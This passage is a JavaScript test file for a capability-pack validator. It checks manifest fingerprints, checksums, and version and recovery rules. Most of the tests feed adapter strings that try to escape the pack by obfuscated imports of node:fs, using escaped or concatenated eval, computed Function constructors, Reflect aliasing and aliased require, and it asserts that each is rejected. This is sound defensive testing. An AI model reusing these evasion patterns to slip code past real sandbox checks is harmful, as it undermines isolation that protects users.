import { describe, it } from 'bun:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { tmpdir } from 'node:os';

import { ActuationClass, EffectRecoveryClass } from '../src/core/actuator.mjs';
import { EffectJournal, EffectState } from '../src/core/effect_journal.mjs';
import {
  assertCapabilityManifest,
  assertCapabilityConformanceReceipt,
  assertCapabilityPackChecksums,
  capabilityPackFingerprint,
  validateCapabilityPackManifest,
  world_host_capability_driver_abi_version,
  world_host_capability_pack_format_version,
} from '../src/core/capability_pack.mjs';
import { assertCapabilityResolutionBoundary, assertNoWorldEvidenceKeys, defineCapabilityDriver } from '../src/core/capability_driver.mjs';
import { assertCapabilityPolicyAllows, createCapabilityPolicy, redactCapabilityDiagnostics } from '../src/core/capability_policy.mjs';
import { runCapabilityMode } from '../src/core/capability_modes.mjs';
import { preflightCapabilities } from '../src/core/capabilities.mjs';
import { EnvSecretProvider, assertNoSecretValuePersisted, assertRequiredSecretsAvailable, redactSecrets } from '../src/core/secrets.mjs';
import { FileSecretProvider, PromptSecretProvider } from '../src/bun/secret_providers.mjs';
import { HostEventStream, HostEventType } from '../src/core/observability.mjs';
import {
  FixtureAgentModelCapabilityDriver,
  GenericHttpJsonModelDriver,
  decodeAgentActionFromResolutionInput,
  validateAgentAction,
} from '../src/drivers/model_capability_driver.mjs';
import { GenericHttpJsonCapabilityDriver } from '../src/drivers/generic_http_json_capability_driver.mjs';
import { HumanApprovalCapabilityDriver } from '../src/drivers/human_approval_capability_driver.mjs';
import { CapabilityDriver as FixturePackCapabilityDriver } from '../capability-packs/capability-pack-v0.2-fixture/adapter.mjs';
import { CapabilityDriver as HttpJsonPackCapabilityDriver } from '../capability-packs/capability-pack-v0.2-http-json/adapter.mjs';
import { CapabilityDriver as HumanApprovalPackCapabilityDriver } from '../capability-packs/capability-pack-v0.2-human-approval/adapter.mjs';
import { fromUtf8, stableJson, toHex } from '../src/core/store.mjs';
import { MemoryStore } from '../src/stores/memory_store.mjs';
import { decodeResolutionInputBytes, encodeResolutionInputBytes } from '../src/protocol/world_appliance_wire_codec.mjs';

function captureThrown(fn) {
  try {
    fn();
  } catch (error) {
    return error;
  }
  assert.fail('expected function to throw');
}

describe('Capability Plane v0.2 core contracts', () => {
  it('validates CapabilityPack semantic identity, checksums, and authority boundaries', async () => {
    const manifest = fixtureCapabilityManifest();
    const artifact = fromUtf8('export const adapter = true;');
    const readme = fromUtf8('readme bytes');
    const withChecksums = {
      ...manifest,
      checksums: [
        { path: 'adapter.mjs', checksum: `sha256:${await sha256Hex(artifact)}` },
        { path: 'README.md', checksum: `sha256:${await sha256Hex(readme)}` },
      ],
    };
    const packFingerprint = await capabilityPackFingerprint(withChecksums);
    assert.match(packFingerprint, /^sha256:[0-9a-f]{64}$/);
    const withFingerprint = { ...withChecksums, packFingerprint };
    assert.equal((await validateCapabilityPackManifest(withFingerprint, { verifyFingerprint: true })).packFingerprint, packFingerprint);
    assert.equal(await assertCapabilityPackChecksums(withFingerprint, { 'adapter.mjs': artifact, 'README.md': readme }), true);
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, supportedWorldProtocolVersion: 'v999.0.0' }),
      { code: 'ERR_CAPABILITY_VERSION_UNSUPPORTED' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, supportedApplianceAbiVersion: 'v999' }),
      { code: 'ERR_CAPABILITY_VERSION_UNSUPPORTED' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, supportedTurnClosureVersion: 'v999' }),
      { code: 'ERR_CAPABILITY_VERSION_UNSUPPORTED' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, recoveryClass: EffectRecoveryClass.externallyRecoverable, canRecover: false }),
      { code: 'ERR_CAPABILITY_MANIFEST_INVALID' },
    );
    assert.throws(
      () => assertCapabilityManifest({ ...manifest, recoveryClass: EffectRecoveryClass.transactional, canRecover: false }),
      { code: 'ERR_CAPABILITY_MANIFEST_INVALID' },
    );
    const changedArtifact = fromUtf8('changed adapter bytes');
    const changedArtifactChecksum = `sha256:${await sha256Hex(changedArtifact)}`;
    const changedChecksumManifest = {
      ...withFingerprint,
      checksums: withFingerprint.checksums.map((item) => item.path === 'adapter.mjs'
        ? { ...item, checksum: changedArtifactChecksum }
        : item),
    };
    assert.notEqual(await capabilityPackFingerprint(changedChecksumManifest), packFingerprint);
    await assert.rejects(
      () => validateCapabilityPackManifest(changedChecksumManifest, { verifyFingerprint: true }),
      { code: 'ERR_CAPABILITY_PACK_FINGERPRINT_MISMATCH' },
    );
    const externalAdapter = fromUtf8("export { CapabilityDriver } from '../../src/drivers/model_capability_driver.mjs';");
    const externalAdapterChecksum = `sha256:${await sha256Hex(externalAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: externalAdapterChecksum }],
      }, { 'adapter.mjs': externalAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const localImportAdapter = fromUtf8("import helper from './helper.mjs'; export const CapabilityDriver = helper;");
    const localImportAdapterChecksum = `sha256:${await sha256Hex(localImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: localImportAdapterChecksum }],
      }, { 'adapter.mjs': localImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const localHelper = fromUtf8('export default { ok: true };');
    const localHelperChecksum = `sha256:${await sha256Hex(localHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      docs: [],
      checksums: [
        { path: 'adapter.mjs', checksum: localImportAdapterChecksum },
        { path: 'helper.mjs', checksum: localHelperChecksum },
      ],
    }, { 'adapter.mjs': localImportAdapter, 'helper.mjs': localHelper }), true);
    const extensionlessLocalImportAdapter = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;");
    const extensionlessLocalImportAdapterChecksum = `sha256:${await sha256Hex(extensionlessLocalImportAdapter)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      docs: [],
      checksums: [
        { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
        { path: 'helper.mjs', checksum: localHelperChecksum },
      ],
    }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper }), true);
    const typeScriptExtensionlessLocalImportAdapter = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;\n");
    const typeScriptExtensionlessLocalImportAdapterChecksum = `sha256:${await sha256Hex(typeScriptExtensionlessLocalImportAdapter)}`;
    const extensionlessTypeScriptLocalHelper = fromUtf8('type Helper = { ok: boolean }; export default { ok: true } satisfies Helper;\n');
    const extensionlessTypeScriptLocalHelperChecksum = `sha256:${await sha256Hex(extensionlessTypeScriptLocalHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'in_process', module: 'adapter.ts', exportName: 'CapabilityDriver' },
      docs: [],
      checksums: [
        { path: 'adapter.ts', checksum: typeScriptExtensionlessLocalImportAdapterChecksum },
        { path: 'helper', checksum: extensionlessTypeScriptLocalHelperChecksum },
      ],
    }, { 'adapter.ts': typeScriptExtensionlessLocalImportAdapter, helper: extensionlessTypeScriptLocalHelper }), true);
    const javaScriptAdapterImportingExtensionlessTypeScriptHelper = fromUtf8("import helper from './helper'; export const CapabilityDriver = helper;\n");
    const javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum = `sha256:${await sha256Hex(javaScriptAdapterImportingExtensionlessTypeScriptHelper)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      docs: [],
      checksums: [
        { path: 'adapter.mjs', checksum: javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum },
        { path: 'helper', checksum: extensionlessTypeScriptLocalHelperChecksum },
      ],
    }, { 'adapter.mjs': javaScriptAdapterImportingExtensionlessTypeScriptHelper, helper: extensionlessTypeScriptLocalHelper }), true);
    const extensionlessCredentialHelper = fromUtf8('const API_KEY = "supersecret123"; export default API_KEY;\n');
    const extensionlessCredentialHelperChecksum = `sha256:${await sha256Hex(extensionlessCredentialHelper)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: javaScriptAdapterImportingExtensionlessTypeScriptHelperChecksum },
          { path: 'helper', checksum: extensionlessCredentialHelperChecksum },
        ],
      }, { 'adapter.mjs': javaScriptAdapterImportingExtensionlessTypeScriptHelper, helper: extensionlessCredentialHelper }),
      { code: 'ERR_CAPABILITY_PACK_CREDENTIAL_FORBIDDEN' },
    );
    const directoryImportAdapter = fromUtf8("import helper from './helper/'; export const CapabilityDriver = helper;");
    const directoryImportAdapterChecksum = `sha256:${await sha256Hex(directoryImportAdapter)}`;
    const externalIndexHelper = fromUtf8("import fs from 'node:fs'; export default fs;");
    const externalIndexHelperChecksum = `sha256:${await sha256Hex(externalIndexHelper)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: directoryImportAdapterChecksum },
          { path: 'helper.mjs', checksum: localHelperChecksum },
          { path: 'helper/index.mjs', checksum: externalIndexHelperChecksum },
        ],
      }, {
        'adapter.mjs': directoryImportAdapter,
        'helper.mjs': localHelper,
        'helper/index.mjs': externalIndexHelper,
      }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const nativeImportAdapter = fromUtf8("import addon from './addon.node'; export const CapabilityDriver = addon;");
    const nativeImportAdapterChecksum = `sha256:${await sha256Hex(nativeImportAdapter)}`;
    const nativeAddon = new Uint8Array([0, 1, 2, 3]);
    const nativeAddonChecksum = `sha256:${await sha256Hex(nativeAddon)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: nativeImportAdapterChecksum },
          { path: 'addon.node', checksum: nativeAddonChecksum },
        ],
      }, { 'adapter.mjs': nativeImportAdapter, 'addon.node': nativeAddon }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const nestedLocalImportAdapter = fromUtf8("import helper from './helper.mjs'; export const CapabilityDriver = helper;");
    const nestedLocalImportAdapterChecksum = `sha256:${await sha256Hex(nestedLocalImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { ...manifest.adapter, module: 'dir/adapter.mjs' },
        docs: [],
        checksums: [
          { path: 'dir/adapter.mjs', checksum: nestedLocalImportAdapterChecksum },
          { path: './helper.mjs', checksum: localHelperChecksum },
        ],
      }, { 'dir/adapter.mjs': nestedLocalImportAdapter, './helper.mjs': localHelper }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { ...manifest.adapter, module: 'dir/adapter.mjs' },
      docs: [],
      checksums: [
        { path: 'dir/adapter.mjs', checksum: nestedLocalImportAdapterChecksum },
        { path: 'dir/helper.mjs', checksum: localHelperChecksum },
      ],
    }, { 'dir/adapter.mjs': nestedLocalImportAdapter, 'dir/helper.mjs': localHelper }), true);
    const externalLocalHelper = fromUtf8("import fs from 'node:fs'; export default fs;");
    const externalLocalHelperChecksum = `sha256:${await sha256Hex(externalLocalHelper)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: localImportAdapterChecksum },
          { path: 'helper.mjs', checksum: externalLocalHelperChecksum },
        ],
      }, { 'adapter.mjs': localImportAdapter, 'helper.mjs': externalLocalHelper }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
          { path: 'helper.mjs', checksum: localHelperChecksum },
          { path: 'helper.ts', checksum: externalLocalHelperChecksum },
        ],
      }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper, 'helper.ts': externalLocalHelper }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [
          { path: 'adapter.mjs', checksum: extensionlessLocalImportAdapterChecksum },
          { path: 'helper.mjs', checksum: localHelperChecksum },
          { path: './helper.ts', checksum: externalLocalHelperChecksum },
        ],
      }, { 'adapter.mjs': extensionlessLocalImportAdapter, 'helper.mjs': localHelper, './helper.ts': externalLocalHelper }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const typeScriptJsImportAdapter = fromUtf8("import helper from './helper.js'; export const driver = helper;");
    const typeScriptJsImportAdapterChecksum = `sha256:${await sha256Hex(typeScriptJsImportAdapter)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { ...manifest.adapter, module: 'adapter.ts' },
      docs: [],
      checksums: [
        { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
        { path: 'helper.ts', checksum: localHelperChecksum },
      ],
    }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.ts': localHelper }), true);
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { ...manifest.adapter, module: 'adapter.ts' },
      docs: [],
      checksums: [
        { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
        { path: 'helper.js', checksum: localHelperChecksum },
        { path: 'helper.ts', checksum: externalLocalHelperChecksum },
      ],
    }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.js': localHelper, 'helper.ts': externalLocalHelper }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { ...manifest.adapter, module: 'adapter.ts' },
        docs: [],
        checksums: [
          { path: 'adapter.ts', checksum: typeScriptJsImportAdapterChecksum },
          { path: 'helper.ts', checksum: externalLocalHelperChecksum },
        ],
      }, { 'adapter.ts': typeScriptJsImportAdapter, 'helper.ts': externalLocalHelper }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const bareImportAdapter = fromUtf8("const helper = await import('helper-package'); export const CapabilityDriver = helper.Driver;");
    const bareImportAdapterChecksum = `sha256:${await sha256Hex(bareImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: bareImportAdapterChecksum }],
      }, { 'adapter.mjs': bareImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedImportAdapter = fromUtf8("const specifier = './helper.mjs'; const helper = await import(specifier); export const CapabilityDriver = helper.Driver;");
    const computedImportAdapterChecksum = `sha256:${await sha256Hex(computedImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedImportAdapterChecksum }],
      }, { 'adapter.mjs': computedImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const prefixedStaticImportAdapter = fromUtf8(";import fs from 'node:fs'; export const CapabilityDriver = fs;");
    const prefixedStaticImportAdapterChecksum = `sha256:${await sha256Hex(prefixedStaticImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: prefixedStaticImportAdapterChecksum }],
      }, { 'adapter.mjs': prefixedStaticImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const compactStaticImportAdapter = fromUtf8("import{readFile}from 'node:fs/promises'; export const CapabilityDriver = readFile;");
    const compactStaticImportAdapterChecksum = `sha256:${await sha256Hex(compactStaticImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: compactStaticImportAdapterChecksum }],
      }, { 'adapter.mjs': compactStaticImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const requireAdapter = fromUtf8("const fs = require('node:fs'); export const CapabilityDriver = fs;");
    const requireAdapterChecksum = `sha256:${await sha256Hex(requireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: requireAdapterChecksum }],
      }, { 'adapter.mjs': requireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const dottedRequireAdapter = fromUtf8("const fs = globalThis.require('node:fs'); export const CapabilityDriver = fs;");
    const dottedRequireAdapterChecksum = `sha256:${await sha256Hex(dottedRequireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: dottedRequireAdapterChecksum }],
      }, { 'adapter.mjs': dottedRequireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const escapedEvalAdapter = fromUtf8("const fs = globalThis.e\\u0076al('import(\"node:fs\")'); export const CapabilityDriver = fs;");
    const escapedEvalAdapterChecksum = `sha256:${await sha256Hex(escapedEvalAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: escapedEvalAdapterChecksum }],
      }, { 'adapter.mjs': escapedEvalAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const moduleRequireAdapter = fromUtf8("const fs = module.require('node:fs'); export const CapabilityDriver = fs;");
    const moduleRequireAdapterChecksum = `sha256:${await sha256Hex(moduleRequireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: moduleRequireAdapterChecksum }],
      }, { 'adapter.mjs': moduleRequireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedRequireAdapter = fromUtf8("const fs = globalThis['require']('node:fs'); export const CapabilityDriver = fs;");
    const computedRequireAdapterChecksum = `sha256:${await sha256Hex(computedRequireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedRequireAdapterChecksum }],
      }, { 'adapter.mjs': computedRequireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedRequireAdapter = fromUtf8("const r = require; const fs = r('node:fs'); export const CapabilityDriver = fs;");
    const aliasedRequireAdapterChecksum = `sha256:${await sha256Hex(aliasedRequireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedRequireAdapterChecksum }],
      }, { 'adapter.mjs': aliasedRequireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const commentedImportAdapter = fromUtf8("const fs = await import/* adapter bypass */('node:fs'); export const CapabilityDriver = fs;");
    const commentedImportAdapterChecksum = `sha256:${await sha256Hex(commentedImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: commentedImportAdapterChecksum }],
      }, { 'adapter.mjs': commentedImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const functionImportAdapter = fromUtf8('const fs = Function("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const functionImportAdapterChecksum = `sha256:${await sha256Hex(functionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: functionImportAdapterChecksum }],
      }, { 'adapter.mjs': functionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedFunctionImportAdapter = fromUtf8('const fs = globalThis["Function"]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const computedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(computedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': computedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const reflectFunctionImportAdapter = fromUtf8('const F = Reflect.get(globalThis, "Function"); const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const reflectFunctionImportAdapterChecksum = `sha256:${await sha256Hex(reflectFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: reflectFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': reflectFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const descriptorFunctionImportAdapter = fromUtf8('const F = Object.getOwnPropertyDescriptor(globalThis, "Function").value; const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const descriptorFunctionImportAdapterChecksum = `sha256:${await sha256Hex(descriptorFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: descriptorFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': descriptorFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const reflectAliasFunctionImportAdapter = fromUtf8('const R = Reflect; const get = R.get; const F = get(globalThis, "Function"); const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const reflectAliasFunctionImportAdapterChecksum = `sha256:${await sha256Hex(reflectAliasFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: reflectAliasFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': reflectAliasFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedComputedFunctionImportAdapter = fromUtf8('const F = globalThis["Function"]; const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const aliasedComputedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(aliasedComputedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedComputedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': aliasedComputedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const escapedComputedFunctionImportAdapter = fromUtf8('const fs = globalThis["Funct\\u0069on"]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const escapedComputedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(escapedComputedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: escapedComputedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': escapedComputedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const parenthesizedComputedFunctionImportAdapter = fromUtf8('const name = "Function"; const fs = (globalThis)[name]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const parenthesizedComputedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(parenthesizedComputedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: parenthesizedComputedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': parenthesizedComputedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedGlobalFunctionImportAdapter = fromUtf8('const name = "Function"; const g = globalThis; const F = g[name]; const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const aliasedGlobalFunctionImportAdapterChecksum = `sha256:${await sha256Hex(aliasedGlobalFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedGlobalFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': aliasedGlobalFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const assignedGlobalFunctionImportAdapter = fromUtf8('const name = "Function"; let g; g = globalThis; const F = g[name]; const fs = F("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const assignedGlobalFunctionImportAdapterChecksum = `sha256:${await sha256Hex(assignedGlobalFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: assignedGlobalFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': assignedGlobalFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const escapedComputedRequireAdapter = fromUtf8("const fs = globalThis['requ\\u0069re']('node:fs'); export const CapabilityDriver = fs;");
    const escapedComputedRequireAdapterChecksum = `sha256:${await sha256Hex(escapedComputedRequireAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: escapedComputedRequireAdapterChecksum }],
      }, { 'adapter.mjs': escapedComputedRequireAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedEvalExpressionAdapter = fromUtf8('const fs = globalThis["ev"+"al"]("import(\\"node:fs\\")"); export const CapabilityDriver = fs;');
    const computedEvalExpressionAdapterChecksum = `sha256:${await sha256Hex(computedEvalExpressionAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedEvalExpressionAdapterChecksum }],
      }, { 'adapter.mjs': computedEvalExpressionAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const aliasedComputedEvalExpressionAdapter = fromUtf8('const e = globalThis["ev"+"al"]; const fs = e("import(\\"node:fs\\")"); export const CapabilityDriver = fs;');
    const aliasedComputedEvalExpressionAdapterChecksum = `sha256:${await sha256Hex(aliasedComputedEvalExpressionAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: aliasedComputedEvalExpressionAdapterChecksum }],
      }, { 'adapter.mjs': aliasedComputedEvalExpressionAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const computedFunctionExpressionAdapter = fromUtf8('const fs = globalThis["Fun"+"ction"]("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const computedFunctionExpressionAdapterChecksum = `sha256:${await sha256Hex(computedFunctionExpressionAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: computedFunctionExpressionAdapterChecksum }],
      }, { 'adapter.mjs': computedFunctionExpressionAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const optionalComputedFunctionImportAdapter = fromUtf8('const fs = globalThis["Function"]?.("s", "return import(s)")("node:fs"); export const CapabilityDriver = fs;');
    const optionalComputedFunctionImportAdapterChecksum = `sha256:${await sha256Hex(optionalComputedFunctionImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: optionalComputedFunctionImportAdapterChecksum }],
      }, { 'adapter.mjs': optionalComputedFunctionImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const optionalEvalImportAdapter = fromUtf8('const fs = eval?.("import(\\\"node:fs\\\")"); export const CapabilityDriver = fs;');
    const optionalEvalImportAdapterChecksum = `sha256:${await sha256Hex(optionalEvalImportAdapter)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        docs: [],
        checksums: [{ path: 'adapter.mjs', checksum: optionalEvalImportAdapterChecksum }],
      }, { 'adapter.mjs': optionalEvalImportAdapter }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
